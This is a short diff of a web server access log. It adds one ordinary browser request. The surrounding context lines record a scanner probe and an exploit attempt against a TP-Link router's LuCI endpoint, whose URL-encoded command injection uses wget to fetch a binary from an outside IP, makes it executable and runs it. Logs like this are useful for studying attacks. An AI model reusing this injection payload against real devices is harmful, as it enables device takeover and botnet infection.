@@ -13,3 +13,4 @@
 107.170.243.8 - - [19/May/2024:10:45:45 -0400] "GET /portal/redlion HTTP/1.1" 200 244 "-" "Mozilla/5.0 zgrab/0.x"
 195.1.144.109 - - [19/May/2024:10:47:16 -0400] "GET /cgi-bin/luci/;stok=/locale?form=country&operation=write&country=$(id%3E%60cd+%2Ftmp%3B+rm+-rf+shk%3B+wget+http%3A%2F%2F103.15.222.150%2Fshk%3B+chmod+777+shk%3B+.%2Fshk+tplink%3B+rm+-rf+shk%60) HTTP/1.1" 200 244 "-" "Go-http-client/1.1"
 127.0.0.1 - - [19/May/2024:11:13:20 -0400] "GET / HTTP/1.1" 304 0 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36"
+194.169.175.19 - - [19/May/2024:11:35:43 -0400] "GET / HTTP/1.1" 200 244 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46"
